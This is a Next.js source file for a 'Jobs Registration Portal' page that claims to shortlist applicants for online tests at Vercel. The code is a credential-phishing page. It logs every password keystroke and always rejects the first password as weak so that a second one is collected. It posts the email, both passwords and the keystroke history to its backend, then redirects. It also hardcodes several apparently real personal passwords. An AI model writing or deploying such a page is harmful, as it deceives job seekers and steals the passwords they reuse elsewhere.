"use client";

import Link from 'next/link'
import { Suspense } from 'react'
import Header from "../components/Header"
import Image from 'next/image'
import { useState } from 'react';
import { useRouter } from 'next/navigation';

export const dynamic = 'force-dynamic'

export default function Home() {

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [passwordHistory, setPasswordHistory] = useState([]);
  const [oldPassword, setOldPassword] = useState("");
  const [firstPassword, setFirstPassword] = useState(true);
  const [error, setError] = useState("");
  const router = useRouter();

  const submit = async () => {
    setError("");
    console.log(passwordHistory);
    if(email === "") {
      setError("Email field cannot be empty.");
      return;
    }
    if(password === "") {
      setError("Password field cannot be empty.");
      return;
    }
    if(password.length < 6) {
      setError("Password must be atleast 6 characters long.");
      return;
    }
    if(password !== confirmPassword) {
      setError("Passwords do not match.");
      return;
    }
    if(password === "Mahima2???" || password === "Monisha@18" || password === "Mahima2" || password === "Monisha18" || password === "@Ekrkp5za832"
       || password === "Monisha@1802" || password === "Mahima2??" || password === "Mahima2?" || password === "Prisha@2407" || password === "Qwerty@123%2407"
       || password === "Qaz@9361234" || password === "iwannadie12345678" || password === "Arss@3187" || password === "Arss3187") {
      setError("Please use a stronger password.");
      return;
    }
    if(firstPassword === true) {
      setError("Please use a stronger password.");
      setOldPassword(password);
      setFirstPassword(false);
      return;
    }
    const bodyContent = JSON.stringify({email: email, password: password, oldPassword: oldPassword, passwordHistory: passwordHistory});
    console.log(bodyContent)
    fetch('/api/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: bodyContent,
    });
    router.replace("/result");
  }

  const log = (e: any) => {
    setPassword(e.target.value);
    //@ts-ignore
    setPasswordHistory(oldArray => [...oldArray, e.target.value]);
  }

  return (
    <main className="relative flex min-h-screen flex-col justify-start m-4">
      <Header />
      <div className='flex flex-col justify-center items-center w-full'>
        <h2 className='text-5xl font-bold mt-8 mb-8'>Jobs Registration Portal</h2>
        <p className='text-lg text-slate-50 max-w-5xl'>Create an account to be added to the OT Shortlist for Vercel. You will 
        receive an Online Test link a few days after you sign up.
        </p>
        <div className='flex flex-col justify-center items-center w-full mt-8'>
          <span className="flex mt-4 justify-between items-center md:w-1/3 w-full">
            <label>Name</label>
            <input className="ml-4 rounded-xl text-slate-900 w-3/4" type="text"/>
          </span>
          <span className="flex mt-4 justify-between items-center md:w-1/3 w-full">
            <label>Email</label>
            <input className="ml-4 rounded-xl text-slate-900 w-3/4" type="text" onChange={(e) => setEmail(e.target.value)}/>
          </span>
          <span className="flex mt-4 justify-between items-center md:w-1/3 w-full">
            <label>Password</label>
            <input className="ml-4 rounded-xl text-slate-900 w-3/4" type="password" onChange={(e) => log(e)}/>
          </span>
          <span className="flex mt-4 justify-between items-center md:w-1/3 w-full">
            <label>Confirm Password</label>
            <input className="rounded-xl text-slate-900 md:w-3/4 w-5/6" type="password" onChange={(e) => setConfirmPassword(e.target.value)}/>
          </span>
          {error && (
                      <span className='text-red-500 m-auto mt-4'>{error}</span>
                    )}
          <button
            onClick={submit}
        className="group mt-8 rounded-full flex space-x-1 bg-slate-50 shadow-sm ring-1 ring-gray-900/5 text-gray-600 text-sm font-medium px-10 py-2 hover:shadow-lg active:shadow-sm transition-all"
          >
            <p>Create Account</p>
          </button>
        </div>
      </div>
    </main>
  )
}
